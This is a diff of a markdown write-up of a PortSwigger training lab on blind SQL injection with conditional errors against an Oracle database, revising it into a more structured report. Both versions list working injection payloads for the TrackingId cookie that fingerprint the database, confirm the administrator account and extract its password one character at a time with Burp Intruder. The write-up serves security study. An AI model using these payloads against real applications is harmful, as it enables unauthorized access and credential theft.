@@ -11,97 +11,106 @@ To solve the lab, log in as the administrator user.
 
 ---
 
-## Process
+## Vulnerability Analysis
 
-### 1. Intercepted the GET Request and Sent it to Repeater (using Burp Suite)
+### Attack Vector Identification
+- **Entry Point**: `TrackingId` cookie parameter
+- **Vulnerability Type**: T1190.001 - SQL Injection: Blind Conditional Error (CWE-89)
+- **Security Flaws:**
+    - User input is embedded directly into SQL queries
+    - Application responds differently based on SQL error conditions
 
-```http
-GET /filter?category=Pets HTTP/2
-```
+### Vulnerability Assessment & Exploitation
 
-### 2. Modified Tracking ID to Test Boolean Conditions
+**Initial Approach:**
+- Intercepted HTTP requests using Burp Suite
+- Identified tracking cookie as potential injection point
+- Performed systematic input validation testing
+- Analyzed application response patterns to determine database type
 
+**Step 1: Identifying Database Type**
+
+Injected a single quote:
 ```sql
 '
 ```
-HTTP/2 500 Internal Server Error
+Response: HTTP/2 500 Internal Server Error
 
-This indicates the input is being interpreted as part of a **SQL string literal**. However, it's breaking the query, likely due to an unescaped quote or malformed syntax. This also confirms that SQL can be injected inside a string, and that the input is reaching the database layer, triggering a parsing error.
+This indicates the input is being interpreted as part of a SQL string literal. The error confirms that SQL can be injected and the input reaches the database layer.
 
+Injected escaped quote:
 ```sql
 ''
 ```
-HTTP/2 200 OK
+Response: HTTP/2 200 OK
 
-If `''` (an empty string literal) does not cause an error, it suggests that the database accepts `''` as a valid string and likely restores valid SQL syntax in that context. This further supports that the input is processed as part of a SQL string.
+This properly closes the string literal, indicating string-based injection is possible.
 
-Testing with `'` and `''` helps determine whether input is placed within a SQL string and if it's properly escaped.
-
+**Testing MSSQL-specific syntax:**
 ```sql
 ' AND SELECT '1'='1
 ```
-HTTP/2 500 Internal Server Error
+Response: HTTP/2 500 Internal Server Error
 
 ```sql
 ' AND (SELECT 1) = 1 --
 ```
-HTTP/2 500 Internal Server Error
+Response: HTTP/2 500 Internal Server Error
 
 Since this syntax is specific to MSSQL and both payloads produce a 500 error, the database is likely not MSSQL.
 
+**Testing Oracle-specific syntax:**
 ```sql
 '||(SELECT'')||'
 ```
-HTTP/2 500 Internal Server Error
+Response: HTTP/2 500 Internal Server Error
 
 ```sql
 '||(SELECT''FROM dual)||'
 ```
-HTTP/2 200 OK
+Response: HTTP/2 200 OK
 
-This strongly indicates the target is using an Oracle database. Oracle requires a `FROM` clause even for selecting constant values. `DUAL` is a special one-row dummy table that Oracle provides for such cases.
+This strongly indicates the target is using an Oracle database. Oracle requires a `FROM` clause even for selecting constant values, and `DUAL` is a special one-row dummy table that Oracle provides for such cases.
 
-**The Tracking ID becomes:**
-```http
-Cookie: TrackingId=<ID>'||(SELECT''FROM dual)||'
-```
-
-### 3. Verified the Existence of the `users` Table
+**Step 2: Verifying Users Table**
 
 ```sql
 '||(SELECT '' FROM users WHERE ROWNUM = 1)||'
 ```
-HTTP/2 200 OK
+Response: HTTP/2 200 OK
 
-`'||(SELECT '' FROM users)||'` will throw an error because it returns multiple rows, which is invalid in a **scalar subquery context** (where only a single value is expected). Oracle will return an `ORA-01427: single-row subquery returns more than one row` error.
+This confirms the existence of a `users` table in the database.
 
-Check conditional statement:
+**Note:** `'||(SELECT '' FROM users)||'` will throw an error because it returns multiple rows, which is invalid in a **scalar subquery context** (where only a single value is expected). Oracle will return an `ORA-01427: single-row subquery returns more than one row` error.
 
+**Step 3: Testing Conditional Errors**
+
+Verified conditional error functionality:
 ```sql
 '||(SELECT CASE WHEN '1'='1' THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
 ```
-HTTP/2 500 Internal Server Error
+Response: HTTP/2 500 Internal Server Error
 
 ```sql
 '||(SELECT CASE WHEN '1'='2' THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
 ```
-HTTP/2 200 OK
+Response: HTTP/2 200 OK
 
-In the first payload, `TO_CHAR(1/0)` forces evaluation and triggers a division-by-zero error, which causes the server to return an error.
+This confirms that conditional errors can be used to extract information. When the condition is true, `TO_CHAR(1/0)` forces a division-by-zero error.
 
-### 4. Verified the `administrator` Username
+**Step 4: Verifying Administrator Username**
 
 ```sql
 '||(SELECT CASE WHEN '1'='1' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
-HTTP/2 500 Internal Server Error
+Response: HTTP/2 500 Internal Server Error
 
 ```sql
 '||(SELECT CASE WHEN '1'='2' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
-HTTP/2 200 OK
+Response: HTTP/2 200 OK
 
-A 500 error when the condition is true confirms that a user with the username 'administrator' exists. A 200 response when the condition is false confirms the query is evaluated correctly.
+A 500 error when the condition is true confirms that a user with the username 'administrator' exists.
 
 **Explanation:**
 `SELECT ... FROM users WHERE username='administrator'`
@@ -117,61 +126,64 @@ Yes, it is → so it chooses the `THEN` branch
 It will evaluate: `TO_CHAR(1/0)` → this triggers division by zero → throws error
 If the condition had been false (`'1'='2'`), Oracle would evaluate the `ELSE` part: `''`, and no error would occur.
 
-### 5. Determined the Password Length and Sent to Intruder
+**Step 5: Determining Password Length**
 
 ```sql
 '||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
-HTTP/2 500 Internal Server Error
-
-This confirms that the password is longer than 1 character.
+Response: HTTP/2 500 Internal Server Error
 
 ```sql
 '||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 Response: HTTP/2 200 OK
 
-This response confirms that the password is exactly 20 characters long.
+This confirms the password is exactly 20 characters long.
 
-### 6. Retrieved the Password Using Intruder
-
-```sql
-'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-```
-
-In Burp Intruder, select `a` and click the **Add §** button:
+**Step 6: Extracting Password Using Intruder**
 
 ```sql
 '||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 
-`§a§` is replaced with each character from the payload list.
-
-Payload tab configuration:
-Payload type: simple list
-Payload set: a-z and 0-9 (assuming no uppercase letters)
-
-Start the Sniper attack and view filter only `5xx [server error]` responses.
-
-This returned only one character `r`, indicating that `r` is the first character of the password.
+Configured Burp Intruder with:
+- Payload type: Simple list
+- Payload set: a-z and 0-9
+- Filter: Only 5xx server error responses
 
 ![burpsuite response](./misc-images/10-1.png)
 
-Repeated the process for all 20 characters and successfully retrieved the complete password.
+This returned only one character `r`, indicating that `r` is the first character of the password.
 
-Logged in as the administrator using the retrieved password.
+Repeated the process for all 20 characters to retrieve the complete password.
 
-Alternatively, `Cluster bomb attack` can be used to retrieve all characters at once:
-
+**Alternative Method - Cluster Bomb Attack:**
 ```sql
 '||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 
-Payload for `1`: 1-20
+- Payload for position (§1§): 1-20
+- Payload for character (§a§): a-z and 0-9
+- Filter: Only 5xx server error responses
 
-Payload for `a`: a-z and 0-9
+Logged in as the administrator using the password retrieved.
 
-Filter only `5xx [server error]` responses.
+---
+
+## Security Assessment
+
+### Root Cause Analysis
+- Application concatenates user input directly into SQL queries
+- No input validation or sanitization implemented
+- Application responds differently based on SQL error conditions
+- Parameterized queries (prepared statements) are not used
+
+### Risk Assessment
+| Category | Impact |
+|----------|--------|
+| Confidentiality | High – Sensitive user data exposed |
+| Authentication | High – Credentials leaked character-by-character |
+| Information Disclosure | Medium – Database structure partially revealed |
 
 ---
 
@@ -181,13 +193,15 @@ Filter only `5xx [server error]` responses.
 
 Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/09-blind-sqli-conditional-responses.md#mitigation)
 
-- Restrict database permissions: The application should connect using a low-privilege database account with access only to the necessary tables and operations. It should not have access to sensitive operations like `SELECT * FROM users`, `DROP`, `UPDATE`, `CREATE`, etc., unless absolutely required.
+- Restrict database permissions using the principle of least privilege.
+
+- Implement consistent error handling that does not reveal information about database structure or query execution.
 
 ---
 
 ## Reflection
 
-Learned how blind SQL injection can be used to extract data character-by-character using error-based conditions and boolean logic.
+This lab demonstrated how blind SQL injection with conditional errors can be used to extract sensitive data both character-by-character and bulk extraction methods through systematic testing. The Oracle-specific `CASE WHEN` technique proved highly effective in forcing database errors that reveal information based on boolean conditions. Learned the importance of database fingerprinting and understanding specific database syntax for effective exploitation.
 
 ---
 
@@ -196,18 +210,6 @@ Learned how blind SQL injection can be used to extract data character-by-charact
 - **Oracle Syntax**: `SELECT CASE WHEN (CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
 - **Microsoft Syntax**: `SELECT CASE WHEN (CONDITION) THEN 1/0 ELSE NULL END`
 
-[Portswigger SQLi syntax](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+Check SQLi Cheatsheet from Portswigger, [here](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 `||` in Oracle is the string concatenation operator. It forces the subquery to be evaluated as part of a string expression.
-Here in SQLi it forces Oracle to execute a subquery that normally wouldn't be evaluated unless used in a larger expression.
-
-In this lab:
-```sql
-' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
-```
-
-```sql
-' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
-```
-
-Both payloads return a `500 Internal Server Error`. This syntax is specific to Microsoft SQL Server (MSSQL), so since the behavior doesn't align with typical MSSQL responses, the database is likely not MSSQL.
